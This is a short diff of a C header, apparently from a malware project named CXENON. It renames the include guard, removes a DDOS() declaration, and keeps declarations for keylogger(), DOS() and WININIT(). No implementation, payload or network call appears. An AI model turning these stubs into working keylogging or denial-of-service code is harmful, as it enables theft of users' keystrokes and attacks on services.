@@ -1,5 +1,5 @@
-#ifndef CXENON_H
-#define CXENON_H
+#ifndef CXENONh_H
+#define CXENONh_H
 
 #include <../Include/driver/socket.h>
 
@@ -8,7 +8,6 @@
 int WININIT(void);
 
 char* keylogger(void);
-void DDOS(void);
 void DOS(void);
 
 enum USTATUS
